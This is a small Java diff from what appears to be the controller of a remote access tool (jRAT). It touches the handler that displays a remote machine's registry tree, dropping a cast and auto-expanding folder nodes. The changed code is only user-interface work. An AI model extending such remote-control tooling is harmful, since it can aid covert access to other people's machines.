@@ -6,6 +6,7 @@ import io.jrat.controller.Slave;
 import io.jrat.controller.ui.frames.FrameRemoteRegistry;
 import java.io.DataInputStream;
 import javax.swing.ImageIcon;
+import javax.swing.tree.TreePath;
 
 public class Packet54Registry extends AbstractIncomingPacket {
 
@@ -38,13 +39,16 @@ public class Packet54Registry extends AbstractIncomingPacket {
 						continue;
 					}
 					
-					PathTreeNode parent = (PathTreeNode) frame.getTree().getNodeFromPath(path);
+					PathTreeNode parent = frame.getTree().getNodeFromPath(path);
 
 					PathTreeNode node = new FolderTreeNode(name, FrameRemoteRegistry.ICON_FOLDER);
 					try {
 						if (!name.equals(parent.toString())) {
 							frame.getTree().getPathModel().insertNodeInto(node, parent, parent.getChildCount());
 						}
+
+						TreePath tp = new TreePath(parent.getPath());
+						frame.getTree().expandPath(tp);
 					} catch (Exception e) {
 						e.printStackTrace();
 					}
